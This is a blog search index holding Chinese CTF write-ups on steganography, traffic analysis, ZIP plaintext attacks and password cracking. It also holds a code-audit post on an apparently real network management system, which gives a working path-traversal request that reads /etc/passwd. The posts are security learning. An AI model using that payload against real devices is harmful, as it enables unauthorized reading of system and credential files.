<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>2021羊城杯misc</title>
    <url>/2021/09/12/2021ycb/</url>
    <content><![CDATA[<h3 id="misc520"><a href="#misc520" class="headerlink" title="misc520"></a>misc520</h3><p><img data-src="https://cdn.jsdelivr.net/gh/G1uneko/picture_blog@main/img/202308011720359.png"><br>时间匆忙就做了一题还没有提交…<br>是一个经典的usb鼠标流量分析题了<br>下载题目拿到520个套娃zip，直接7z加连点器提取flag.png<br>然后放到Stegsolve.jar看到bgr通道里面有一个zip<br><img data-src="https://cdn.jsdelivr.net/gh/G1uneko/picture_blog@main/img/202308011720358.png"><br>提取出来发现加密拿去爆破password：12345<br>又拿到pacp，打开看看是一个鼠标流量就用kali的工具提取一下数据<br>(USB协议的数据部分在Leftover Capture Data域之中，在Mac和Linux下可以用tshark命令可以将 leftover capture data单独提取出来 命令如下：</p>
<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">tshark -r usb1<span class="selector-class">.pcapng</span> -T fields -e usb<span class="selector-class">.capdata</span> &gt; usbdata.txt</span><br></pre></td></tr></table></figure>
<p>)</p>
<span id="more"></span>
<p><img data-src="https://cdn.jsdelivr.net/gh/G1uneko/picture_blog@main/img/202308011720360.png"><br>发现前面有一堆空行和后面也有空行于是去掉空行：</p>
<figure class="highlight sas"><table><tr><td class="code"><pre><span class="line">cat <span class="keyword">filename</span> | sed -e <span class="string">&#x27;/^$/d&#x27;</span> &gt; <span class="keyword">filename</span></span><br></pre></td></tr></table></figure>
<p>然后</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line">file = <span class="built_in">open</span>(<span class="string">&quot;output.txt&quot;</span>,<span class="string">&#x27;w&#x27;</span>)</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;usb.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> lines:</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> lines:</span><br><span class="line">        result = re.sub(<span class="string">r&quot;(?&lt;=\w)(?=(?:\w\w)+$)&quot;</span>, <span class="string">&quot;:&quot;</span>, line)</span><br><span class="line">        file.write(result)</span><br></pre></td></tr></table></figure>
<p>变成这种形式<br><img data-src="https://cdn.jsdelivr.net/gh/G1uneko/picture_blog@main/img/202308011720361.png"><br>用大佬的脚本</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">nums</span> =<span class="meta"> []</span></span><br><span class="line"><span class="attribute">keys</span> = open(&#x27;output.txt&#x27;,&#x27;r&#x27;)</span><br><span class="line"><span class="attribute">posx</span> = <span class="number">0</span></span><br><span class="line"><span class="attribute">posy</span> = <span class="number">0</span></span><br><span class="line"><span class="attribute">for</span> line in keys:</span><br><span class="line">    <span class="attribute">if</span> len(line) != <span class="number">12</span> :</span><br><span class="line">        <span class="attribute">continue</span></span><br><span class="line">    <span class="attribute">x</span> = int(line[<span class="number">3</span>:<span class="number">5</span>],<span class="number">16</span>)</span><br><span class="line">    <span class="attribute">y</span> = int(line[<span class="number">6</span>:<span class="number">8</span>],<span class="number">16</span>)</span><br><span class="line">    <span class="attribute">if</span> x &gt; <span class="number">127</span> :</span><br><span class="line">        <span class="attribute">x</span> -= <span class="number">256</span></span><br><span class="line">    <span class="attribute">if</span> y &gt; <span class="number">127</span> :</span><br><span class="line">        <span class="attribute">y</span> -= <span class="number">256</span></span><br><span class="line">    <span class="attribute">posx</span> += x</span><br><span class="line">    <span class="attribute">posy</span> += y</span><br><span class="line">    <span class="attribute">btn_flag</span> = int(line[<span class="number">0</span>:<span class="number">2</span>],<span class="number">16</span>)  # <span class="number">1</span> for left , <span class="number">2</span> for right , <span class="number">0</span> for nothing</span><br><span class="line">    <span class="attribute">if</span> btn_flag == <span class="number">1</span> :</span><br><span class="line">        <span class="attribute">print</span> posx , posy       </span><br><span class="line">    <span class="attribute">keys</span>.close()</span><br></pre></td></tr></table></figure>
<p>搞出坐标画图发现是反的，改一下y轴坐标为负即</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">nums</span> =<span class="meta"> []</span></span><br><span class="line"><span class="attribute">keys</span> = open(&#x27;output.txt&#x27;,&#x27;r&#x27;)</span><br><span class="line"><span class="attribute">posx</span> = <span class="number">0</span></span><br><span class="line"><span class="attribute">posy</span> = <span class="number">0</span></span><br><span class="line"><span class="attribute">for</span> line in keys:</span><br><span class="line">    <span class="attribute">if</span> len(line) != <span class="number">12</span> :</span><br><span class="line">        <span class="attribute">continue</span></span><br><span class="line">    <span class="attribute">x</span> = int(line[<span class="number">3</span>:<span class="number">5</span>],<span class="number">16</span>)</span><br><span class="line">    <span class="attribute">y</span> = int(line[<span class="number">6</span>:<span class="number">8</span>],<span class="number">16</span>)</span><br><span class="line">    <span class="attribute">if</span> x &gt; <span class="number">127</span> :</span><br><span class="line">        <span class="attribute">x</span> -= <span class="number">256</span></span><br><span class="line">    <span class="attribute">if</span> y &gt; <span class="number">127</span> :</span><br><span class="line">        <span class="attribute">y</span> -= <span class="number">256</span></span><br><span class="line">    <span class="attribute">posx</span> += x</span><br><span class="line">    <span class="attribute">posy</span> += y</span><br><span class="line">    <span class="attribute">btn_flag</span> = int(line[<span class="number">0</span>:<span class="number">2</span>],<span class="number">16</span>)  # <span class="number">1</span> for left , <span class="number">2</span> for right , <span class="number">0</span> for nothing</span><br><span class="line">    <span class="attribute">if</span> btn_flag == <span class="number">1</span> :</span><br><span class="line">        <span class="attribute">print</span> posx , -posy</span><br><span class="line"><span class="attribute">keys</span>.close()</span><br></pre></td></tr></table></figure>
<p>拿去py2一下得出坐标然后kali下gnupolt和plot “loacl.txt”，得flag</p>
]]></content>
      <tags>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>某3c代码审计</title>
    <url>/2023/08/15/H3C_day01/</url>
    <content><![CDATA[<h1 id="某网管系统任意文件读取代码审计"><a href="#某网管系统任意文件读取代码审计" class="headerlink" title="某网管系统任意文件读取代码审计"></a>某网管系统任意文件读取代码审计</h1><span id="more"></span>
<h3 id="漏洞点："><a href="#漏洞点：" class="headerlink" title="漏洞点："></a>漏洞点：</h3><p>漏洞出现在sys_data_collect.mds这个文件，太菜了不知道为什么开发要这么写mds然后mod包含mds，然后php再引用mod文件，这里很明显file_name没有过滤直接拼接到目录下面，然后file_get_contents读取了文件再echo<br><img data-src="https://cdn.jsdelivr.net/gh/G1uneko/picture_blog@main/img/202308150951962.png"></p>
<p>我们再往上面找<br><img data-src="https://cdn.jsdelivr.net/gh/G1uneko/picture_blog@main/img/202308150952459.png"></p>
<p><img data-src="https://cdn.jsdelivr.net/gh/G1uneko/picture_blog@main/img/202308150957174.png"></p>
<p>可以看到在index这个php引用了这个文件，触发条件是$get_url_param == ‘sys_dia_data_down’，我们只需要控制这个值进入判断然后给file_name传参就行，其中get_url_param这个变量是来自前端传参，代码块如下：<br><img data-src="https://cdn.jsdelivr.net/gh/G1uneko/picture_blog@main/img/202308150958074.png"></p>
<h3 id="利用漏洞："><a href="#利用漏洞：" class="headerlink" title="利用漏洞："></a>利用漏洞：</h3><p>于是构造payload：</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line"><span class="regexp">/webui/i</span>ndex.php?file_name=..<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/etc/</span>passwd&amp;g=sys_dia_data_down</span><br></pre></td></tr></table></figure>

<p><img data-src="https://cdn.jsdelivr.net/gh/G1uneko/picture_blog@main/img/202308150958077.png"></p>
<p><img data-src="https://cdn.jsdelivr.net/gh/G1uneko/picture_blog@main/img/202308150958076.png"></p>
<p>利用成功，剩下一个rce 0day下次再写，已经好久没更新博客了，要勤快更新了，记录下学习过程</p>
]]></content>
      <tags>
        <tag>web代码审计</tag>
      </tags>
  </entry>
  <entry>
    <title>ctf001</title>
    <url>/2020/05/23/ctf01/</url>
    <content><![CDATA[<p>又到了周末，上网课是真的难受，今天就写写前几天做的题吧(由于我太菜，只做了几道misc)。（图太多了，懒得转移图床QAQ）</p>
<h3 id="misc1"><a href="#misc1" class="headerlink" title="misc1"></a>misc1</h3><p><img data-src="img/ctf01/misc101.png" alt="misc1"><br>下载题目得到一个zip，解压得到一张图片。<br><img data-src="img/ctf01/misc102.png" alt="misc1"><br>先用010打开一下，发现尾部之后有一串base32编码。<br><img data-src="img/ctf01/misc103.png" alt="misc1"></p>
<span id="more"></span>
<p>拿去在线解码，得到这个:<br><img data-src="img/ctf01/misc104.png" alt="misc1"><br>发现是又是一串奇怪的字符，emmm，也可能是16进制，然后想想常用的文件的头和尾，好像也不是，然后看到了尾部的o405感觉和zip的头部504b相似。<br>然后拿去在线字符翻转。<br><img data-src="img/ctf01/misc105.png" alt="misc1"><br>思考是不是zip的文件然后经过了加密，然后就找到了rot13<br><img data-src="img/ctf01/misc106.png" alt="misc1"><br>拿去在线解密，复制，另存为zip文件，然后解压…<br><img data-src="img/ctf01/misc107.png" alt="misc1"><br>然后….加密了？<br><img data-src="img/ctf01/misc108.png" alt="misc1"><br><img data-src="img/ctf01/misc108.jpg" alt="misc1"><br>也没有密码，先看看是不是文件伪加密。<br><img data-src="img/ctf01/misc109.png" alt="misc1"><br>发现伪加密，然后解压得到flag。<br><img data-src="img/ctf01/misc100.png" alt="misc1">  </p>
<hr>
<h3 id="misc2"><a href="#misc2" class="headerlink" title="misc2"></a>misc2</h3><p>又是一张图片<br><img data-src="img/ctf01/misc200.png" alt="misc2"><br>发现图片有500kb大小，里面会不会藏东西，拿去kali扫描一下，无获……<br><img data-src="img/ctf01/misc201.png" alt="misc2"><br>于是只好看rgb通道有没有什么收获<br><img data-src="img/ctf01/misc202.png" alt="misc2"><br>发现一张二维码，嘻嘻<br><img data-src="img/ctf01/misc203.png" alt="misc2"><br>但是扫描后又是奇怪的字符估计又是hex。<br>看到是pyc的头部…<br>然后拿去在线工具运行。<br><img data-src="img/ctf01/misc204.png" alt="misc2"><br>在python运行一下得到flag。</p>
<hr>
<h3 id="misc3"><a href="#misc3" class="headerlink" title="misc3"></a>misc3</h3><p>一个小滑稽<br><img data-src="img/ctf01/misc300.png" alt="misc3"><br>先用010打开，发现jpg尾部之后还有东西。<br><img data-src="img/ctf01/misc301.png" alt="misc3"><br>于是想想会不会后面藏了什么文件，继续往下看，看到了png的头89504E47<br><img data-src="img/ctf01/misc302.png" alt="misc3"><br>就像这样子<br><img data-src="img/ctf01/misc303.jpg" alt="misc3"><br>然后就写一个小小的py脚本:<br>    flie = ‘a.txt’<br>    with open(flie,’r+’) as f:<br>        r = f.read()<br>        list1 = r.split(‘ ‘)<br>    with open(‘xie.txt’,’w’) as x:<br>        yaor = ‘’<br>        for i in range(len(list1)):<br>            yaor = list1[-1] + ‘ ‘<br>            list1.pop(-1)<br>            x.write(yaor)<br>然后复制另存为png就完事了<br><img data-src="img/ctf01/misc303.png" alt="misc3"></p>
<hr>
<h3 id="misc4"><a href="#misc4" class="headerlink" title="misc4"></a>misc4</h3><p>emmm，是一个pcap文件，流量分析还不是还会，顺便学习好了。<br><img data-src="img/ctf01/misc400.png" alt="misc4"><br>过滤一下http协议<br><img data-src="img/ctf01/misc401.png" alt="misc4"><br>看见一个md5加密和gzcompress()函数<br><img data-src="img/ctf01/misc402.png" alt="misc4"><br>于是md5拿去在线网站撞库，得到cometohackme，无果…<br>继续看看剩下的，http追踪流发现一串字符串，感觉是base64的密文，拿去php解密<br><img data-src="img/ctf01/misc403.png" alt="misc4"><br><img data-src="img/ctf01/misc405.png" alt="misc4"><br>得flag</p>
<hr>
<h3 id="misc5"><a href="#misc5" class="headerlink" title="misc5"></a>misc5</h3><p>是一个图<br><img data-src="img/ctf01/misc500.png" alt="misc5"><br>有300kb了，再一次拿到kali扫描<br><img data-src="img/ctf01/misc501.png" alt="misc5"><br>再一次无果<br><img data-src="img/ctf01/misc502.jpg" alt="misc5"><br>(可恶….是幻术吗…明明感觉是这样子…怎么会再一次…大意了)<br>然后看看rgb通道，没有什么东西。考虑lsb隐写，然后得到zip的hex<br><img data-src="img/ctf01/misc502.png" alt="misc5"><br>文件损坏…拿WinRAR修复一下<br><img data-src="img/ctf01/misc503.png" alt="misc5"><br>得到一个未知文件，用010打开是一个elf文件，要用kali打开<br><img data-src="img/ctf01/misc507.png" alt="misc5"><br><img data-src="img/ctf01/misc504.png" alt="misc5"><br><img data-src="img/ctf01/misc505.png" alt="misc5"><br>sudo chmon 755 1 给一个限权<br><img data-src="img/ctf01/misc506.png" alt="misc5"></p>
]]></content>
      <tags>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>ctf02</title>
    <url>/2020/10/05/ctf02/</url>
    <content><![CDATA[<h3 id="关于8月的ctfwp-D"><a href="#关于8月的ctfwp-D" class="headerlink" title="关于8月的ctfwp :D"></a>关于8月的ctfwp :D</h3><p>2020ciscn’s wp: <a href="https://www.gem-love.com/ctf/2569.html">https://www.gem-love.com/ctf/2569.html</a><br>                <a href="https://www.gksec.com/amp/CISCN2020_Online_WriteUp.html">https://www.gksec.com/amp/CISCN2020_Online_WriteUp.html</a><br>2020gactf’s wp:<a href="https://mp.weixin.qq.com/s/7POuTp37wzY7bS3R-Fldog">https://mp.weixin.qq.com/s/7POuTp37wzY7bS3R-Fldog</a><br>                misc: <a href="https://mp.weixin.qq.com/s/TXXyzswABUv4cLDOw5SdI">https://mp.weixin.qq.com/s/TXXyzswABUv4cLDOw5SdI</a><br>                Crypto: <a href="https://mp.weixin.qq.com/s/c4bK2R_n_r5q_7rSidEuTg">https://mp.weixin.qq.com/s/c4bK2R_n_r5q_7rSidEuTg</a><br>                WEB: <a href="https://mp.weixin.qq.com/s/H0-imfruCTIXtMG16a9CIA">https://mp.weixin.qq.com/s/H0-imfruCTIXtMG16a9CIA</a><br><img data-src="https://cdn.jsdelivr.net/gh/G1uneko/picture_blog@main/img/202308011728472.gif"><br>钓鱼城杯量子加密misc题：</p>
<span id="more"></span>

<p><strong>《量子加密》writeup by @xmcp</strong></p>
<p>本题有跑脚本的环节，下文所述的运行时间在一台i 7 - 10510U (25W) 笔记本电脑上测出。</p>
<p><strong>解题过程分为三个部分： 1 ) 解密ZIP， 2 ) 分析流量， 3 ) 破解口令。</strong></p>
<h1 id="解密ZIP"><a href="#解密ZIP" class="headerlink" title="解密ZIP"></a>解密ZIP</h1><h2 id="首先打开压缩包，发现有密码保护，看到注释："><a href="#首先打开压缩包，发现有密码保护，看到注释：" class="headerlink" title="首先打开压缩包，发现有密码保护，看到注释："></a>首先打开压缩包，发现有密码保护，看到注释：</h2><figure class="highlight livecodeserver"><table><tr><td class="code"><pre><span class="line">Password is longer than <span class="number">16</span> <span class="keyword">bytes</span>, <span class="keyword">and</span> includes <span class="keyword">at</span> least <span class="literal">one</span> <span class="built_in">number</span> <span class="keyword">and</span> <span class="literal">one</span> uppercase letter.</span><br><span class="line">Feel free <span class="built_in">to</span> crack <span class="keyword">it</span> <span class="keyword">if</span> you can, probably <span class="keyword">with</span> your high-performance quantum computer :)</span><br></pre></td></tr></table></figure>
<p>说明难以暴力破解。</p>
<p>压缩包里面有“capture.pcapng”和“hint_for_capture.txt”，压缩算法都是Store，这很奇怪，因<br>为pcapng并非十分紧密的格式，压缩软件没有理由不压缩它。</p>
<p>因此我们考虑ZIP明文攻击，只需要知道pcapng中至少 12 个字节（其中至少 8 个字节连<br>续）的内容即可破解。</p>
<p>上网搜索<a href="https://pcapng.github.io/pcapng/">pcapng的文件头格式：</a></p>
<p><img data-src="https://cdn.jsdelivr.net/gh/G1uneko/picture_blog@main/img/202308011728473.png"></p>
<p>红色部分是固定的：Block Type始终为 0 A0D0D0A；Block Total Length是小端存储的Header<br>长度，显然不会超过64KB，所以高两位都是 00 ；Byte-Order Magic在小端机器上始终为<br>4 D3C2B1A；Major Version目前只有 0100 ；Minor Version目前只有 0000 。</p>
<p>这样可以知道文件中的 4 + 10 字节内容，满足明文攻击的要求。</p>
<p>其实蓝色部分也是可以猜出来的：Section Length是可选字段，大多数软件（比如WireShark）<br>在保存pcapng时会写入- 1 （即 8 个字节的FF）。</p>
<h2 id="因此，把蓝色部分也算上的话，我们知道文件中的4-18-字节内容，对明文攻击绰绰有余了。"><a href="#因此，把蓝色部分也算上的话，我们知道文件中的4-18-字节内容，对明文攻击绰绰有余了。" class="headerlink" title="因此，把蓝色部分也算上的话，我们知道文件中的4+ 18 字节内容，对明文攻击绰绰有余了。"></a>因此，把蓝色部分也算上的话，我们知道文件中的4+ 18 字节内容，对明文攻击绰绰有余了。</h2><h2 id="为了严谨起见，我们只使用十分确定的红色部分进行明文攻击。"><a href="#为了严谨起见，我们只使用十分确定的红色部分进行明文攻击。" class="headerlink" title="为了严谨起见，我们只使用十分确定的红色部分进行明文攻击。"></a>为了严谨起见，我们只使用十分确定的红色部分进行明文攻击。</h2><p>注意到AZPR不支持明文分段的ZIP明文攻击，我们使用<a href="https://github.com/kimci86/bkcrack">bkcrack</a>.</p>
<p>在压缩包中提取出密文capture.pcapng.enc（ 888832 字节）和hint_for_capture.txt.enc（ 48<br>字节），把已知的 10 字节明文保存为capture.pcapng.plain。运行下面的命令进行攻击：<br><img data-src="https://cdn.jsdelivr.net/gh/G1uneko/picture_blog@main/img/202308011728474.png"></p>
<h2 id="运行-29-分钟后得到秘钥。运行下面的命令解密文件："><a href="#运行-29-分钟后得到秘钥。运行下面的命令解密文件：" class="headerlink" title="运行 29 分钟后得到秘钥。运行下面的命令解密文件："></a>运行 29 分钟后得到秘钥。运行下面的命令解密文件：</h2><p><img data-src="https://cdn.jsdelivr.net/gh/G1uneko/picture_blog@main/img/202308011728475.png"></p>
<h1 id="分析流量"><a href="#分析流量" class="headerlink" title="分析流量"></a>分析流量</h1><p>打开pcap看到上千个HTTP流量，用Fiddler查看发现全都是对192.168.142.138:8080的请<br>求，User-Agent为sqlmap/1.3.5.105#dev，可以判断是sqlmap自动对服务器进行SQL注入<br>的过程。<br><img data-src="https://cdn.jsdelivr.net/gh/G1uneko/picture_blog@main/img/202308011728476.png"></p>
<p>具体观察请求参数和响应，发现sqlmap在尝试盲注flags表的flag字段，请求使用了HEAD<br>方法（对应sqlmap的–null-connection参数），而且请求顺序是乱的（对应sqlmap的–<br>threads参数）。</p>
<p>根据前几个GET的响应可以判断出响应头Content-Length为 5 表示“error”，为 2 表示“ok”。<br><img data-src="https://cdn.jsdelivr.net/gh/G1uneko/picture_blog@main/img/202308011728477.png"></p>
<p>例如上述请求在判断flag的第 32 位字符是否大于 0 x 65 ，返回 5 表明结果是否定的。</p>
<p>将所有HTTP请求导出成文本文件：<br><img data-src="https://cdn.jsdelivr.net/gh/G1uneko/picture_blog@main/img/202308011728478.png"></p>
<p>然后编写脚本获得flag内容：<br><img data-src="https://cdn.jsdelivr.net/gh/G1uneko/picture_blog@main/img/202308011728479.png"></p>
<p>根据hint_for_capture.txt的提示，得到的内容经过了base85编码。<br><img data-src="https://cdn.jsdelivr.net/gh/G1uneko/picture_blog@main/img/202308011728480.png"><br>将脚本输出base 85 解码得到：</p>
<figure class="highlight isbl"><table><tr><td class="code"><pre><span class="line"><span class="variable">flag</span> <span class="variable">is</span> <span class="function"><span class="title">md5</span>(<span class="string">&quot;Sq1it3&quot;</span>+压缩包密码)</span></span><br><span class="line"><span class="variable">Hint</span>: 密码是一个身份证号，且出生年份恰有两个质因子</span><br></pre></td></tr></table></figure>
<h1 id="破解口令"><a href="#破解口令" class="headerlink" title="破解口令"></a>破解口令</h1><p>我们需要破解压缩包口令，考虑John the Ripper。首先用zip2john转换一下：<br><img data-src="https://cdn.jsdelivr.net/gh/G1uneko/picture_blog@main/img/202308011728481.png"></p>
<p>其中hint_for_capture.txt是压缩包中的纯ASCII文件而且比较小，用来加速破解过程。</p>
<p>已经知道压缩包密码是合法的身份证号。由于压缩包注释提到密码包括大写字母，可以推出<br>身份证尾号为X。通过分解质因数得到可行的出生年份列表：<br><img data-src="https://cdn.jsdelivr.net/gh/G1uneko/picture_blog@main/img/202308011728482.png"></p>
<h2 id="我们分析一下身份证的格式："><a href="#我们分析一下身份证的格式：" class="headerlink" title="我们分析一下身份证的格式："></a>我们分析一下身份证的格式：</h2><h2 id="⚫-前-6-位是区号，上网搜一下可以得到区号列表，全国的合法区号不超过-4000-个。"><a href="#⚫-前-6-位是区号，上网搜一下可以得到区号列表，全国的合法区号不超过-4000-个。" class="headerlink" title="⚫ 前 6 位是区号，上网搜一下可以得到区号列表，全国的合法区号不超过 4000 个。"></a>⚫ 前 6 位是区号，上网搜一下可以得到区号列表，全国的合法区号不超过 4000 个。</h2><h2 id="⚫-然后-4-位是出生年份，我们从-2020-往下枚举。"><a href="#⚫-然后-4-位是出生年份，我们从-2020-往下枚举。" class="headerlink" title="⚫ 然后 4 位是出生年份，我们从 2020 往下枚举。"></a>⚫ 然后 4 位是出生年份，我们从 2020 往下枚举。</h2><h2 id="⚫-然后-4-位是出生月日，不超过-366-个。"><a href="#⚫-然后-4-位是出生月日，不超过-366-个。" class="headerlink" title="⚫ 然后 4 位是出生月日，不超过 366 个。"></a>⚫ 然后 4 位是出生月日，不超过 366 个。</h2><h2 id="⚫-然后-3-位是当天的序号，只需要枚举两位，最后一位可以利用校验码唯一确定。"><a href="#⚫-然后-3-位是当天的序号，只需要枚举两位，最后一位可以利用校验码唯一确定。" class="headerlink" title="⚫ 然后 3 位是当天的序号，只需要枚举两位，最后一位可以利用校验码唯一确定。"></a>⚫ 然后 3 位是当天的序号，只需要枚举两位，最后一位可以利用校验码唯一确定。</h2><h2 id="⚫-最后-1-位是校验码，固定为X。"><a href="#⚫-最后-1-位是校验码，固定为X。" class="headerlink" title="⚫ 最后 1 位是校验码，固定为X。"></a>⚫ 最后 1 位是校验码，固定为X。</h2><h2 id="这样一来，密码的值域降低到了-1010-量级，可以进行破解了。"><a href="#这样一来，密码的值域降低到了-1010-量级，可以进行破解了。" class="headerlink" title="这样一来，密码的值域降低到了 1010 量级，可以进行破解了。"></a>这样一来，密码的值域降低到了 1010 量级，可以进行破解了。</h2><p>首先我们在网上搞一份身份证区号列表，存为id_prefix.txt，然后用C++写一个枚举合法身<br>份证号的代码（编译选项-Ofast -march=native，不用Python因为太慢了）。<br><img data-src="https://cdn.jsdelivr.net/gh/G1uneko/picture_blog@main/img/202308011728483.png"></p>
<p>上面这个代码的命令行参数是年份，将把该年的所有尾号为X的合法身份证号输出到stdout。</p>
<p>调用该程序生成字典，然后用john破解。脚本如下：<br><img data-src="https://cdn.jsdelivr.net/gh/G1uneko/picture_blog@main/img/202308011728484.png"></p>
<h2 id="运行-4-分钟后得到密码："><a href="#运行-4-分钟后得到密码：" class="headerlink" title="运行 4 分钟后得到密码："></a>运行 4 分钟后得到密码：</h2><p><img data-src="https://cdn.jsdelivr.net/gh/G1uneko/picture_blog@main/img/202308011728485.png"></p>
<p>计算md5(“Sq1it332070119840810108X”)即得到flag。</p>
]]></content>
      <tags>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>ctf03</title>
    <url>/2020/10/13/ctf03/</url>
    <content><![CDATA[<h3 id="10-13的做题小记录"><a href="#10-13的做题小记录" class="headerlink" title="10.13的做题小记录"></a>10.13的做题小记录</h3><h5 id="1-刷新过的图片"><a href="#1-刷新过的图片" class="headerlink" title="1.刷新过的图片"></a>1.刷新过的图片</h5><p>这里下载题目得到一张图片，hex观察无果，其他的隐写也无果。考虑题目的提示：刷新的按键一般是F5。故考虑F5隐写。<br>F5刷新隐写，原理文献：<a href="https://wenku.baidu.com/view/c9150e29b4daa58da0114a39.html">https://wenku.baidu.com/view/c9150e29b4daa58da0114a39.html</a>,<br>利用工具:<a href="https://github.com/matthewgao/F5-steganography%EF%BC%8C">https://github.com/matthewgao/F5-steganography，</a><br>使用命令：java Extract 123456.jpg -p [password]/[空]，在output.txt找解密后的文本，得flag。</p>
<span id="more"></span>
<h5 id="2-snake"><a href="#2-snake" class="headerlink" title="2.snake"></a>2.snake</h5><p>下载后又是一张jpg,观察图片hex发现熟悉的504B，提取zip后得到两个文件，一个key，一个cipher，打开key，有一串base64字符，解码之后，得到：</p>
<figure class="highlight applescript"><table><tr><td class="code"><pre><span class="line">What <span class="keyword">is</span> Nicki Minaj&#x27;s favorite song <span class="keyword">that</span> refers <span class="keyword">to</span> snakes?</span><br></pre></td></tr></table></figure>
<p>百度一波得到key：anacondam,对于蛇这个名词，在英语中还有一个翻译：Serpent。<br>Serpent是一个加密算法，关于算法的更多详细信息参考<a href="https://blog.csdn.net/douqingl/article/details/50256931">博客</a>,<br>找一个<a href="http://serpent.online-domain-tools.com/">在线网站</a>ecb模式输入key得到flag。</p>
<h5 id="3-梅花香之苦寒来"><a href="#3-梅花香之苦寒来" class="headerlink" title="3.梅花香之苦寒来"></a>3.梅花香之苦寒来</h5><p>下载又又是图片，emmmm，查看hex看到jpg文件尾发现大量字符串<br><img data-src="https://cdn.jsdelivr.net/gh/G1uneko/picture_blog@main/img/202308011734744.png"><br>不难判断这是[^16进制],[^16进制]:一般用数字0到9和字母A到F（或a<del>f）表示，其中:A</del>F表示10~15，这些称作十六进制数字。<br>一个字节一组转ascii码</p>
<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">with <span class="built_in">open</span>(<span class="string">&#x27;hex.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>) as h:</span><br><span class="line">    h=h<span class="selector-class">.read</span>()</span><br><span class="line">j = open (<span class="string">&#x27;ascii.txt&#x27;</span>,<span class="string">&#x27;w&#x27;</span>)</span><br><span class="line"></span><br><span class="line">tem=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> <span class="selector-tag">i</span> <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(h),<span class="number">2</span>):</span><br><span class="line">    tem=<span class="string">&#x27;0x&#x27;</span>+h<span class="selector-attr">[i]</span>+h<span class="selector-attr">[i+1]</span></span><br><span class="line">    tem=<span class="built_in">int</span>(tem,base=<span class="number">16</span>)</span><br><span class="line">    j<span class="selector-class">.write</span>(<span class="built_in">chr</span>(tem))</span><br></pre></td></tr></table></figure>
<p>得到<img data-src="https://cdn.jsdelivr.net/gh/G1uneko/picture_blog@main/img/202308011734745.png"><br>好多好多的坐标，<br>使用gnuplot工具绘图，安装：<br>输入：apt-get install gnuplot，然后输入：gnuplot 就可以打开了<br>但是打开之后并不能良好的使用，会报错：Terminal type set to ‘unknown’<br>因此需要安装多余的依赖包，输入：apt-get install gnuplot-x11<br><img data-src="https://cdn.jsdelivr.net/gh/G1uneko/picture_blog@main/img/202308011734746.png"><br>但是gnuplot识别的坐标为x y以空格作为分隔，所以用脚本让坐标变成gnuplot可以识别的坐标</p>
<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">with <span class="built_in">open</span>(<span class="string">&#x27;ascii.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>)as <span class="selector-tag">a</span>:</span><br><span class="line">    a=<span class="selector-tag">a</span><span class="selector-class">.read</span>()</span><br><span class="line"><span class="selector-tag">p</span> = <span class="built_in">open</span>(<span class="string">&quot;output.txt&quot;</span>,<span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">a=<span class="selector-tag">a</span><span class="selector-class">.split</span>()</span><br><span class="line">tem=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> <span class="selector-tag">i</span> <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(a)):</span><br><span class="line">    tem=<span class="selector-tag">a</span><span class="selector-attr">[i]</span></span><br><span class="line">    tem=tem<span class="selector-class">.lstrip</span>(<span class="string">&#x27;(&#x27;</span>)</span><br><span class="line">    tem=tem<span class="selector-class">.rstrip</span>(<span class="string">&#x27;)&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(tem)):</span><br><span class="line">        <span class="keyword">if</span> tem<span class="selector-attr">[j]</span>==<span class="string">&#x27;,&#x27;</span>:</span><br><span class="line">            tem=tem<span class="selector-attr">[:j]</span>+<span class="string">&#x27; &#x27;</span>+tem<span class="selector-attr">[j+1:]</span></span><br><span class="line">    <span class="selector-tag">p</span><span class="selector-class">.write</span>(tem)</span><br><span class="line">    <span class="selector-tag">p</span><span class="selector-class">.write</span>(<span class="string">&quot;\n&quot;</span>)</span><br></pre></td></tr></table></figure>
<p>最终<img data-src="https://cdn.jsdelivr.net/gh/G1uneko/picture_blog@main/img/202308011734747.png"><br>kali下在output目录下gnuplot: “plot output.txt”<br><img data-src="https://cdn.jsdelivr.net/gh/G1uneko/picture_blog@main/img/202308011734748.png"></p>
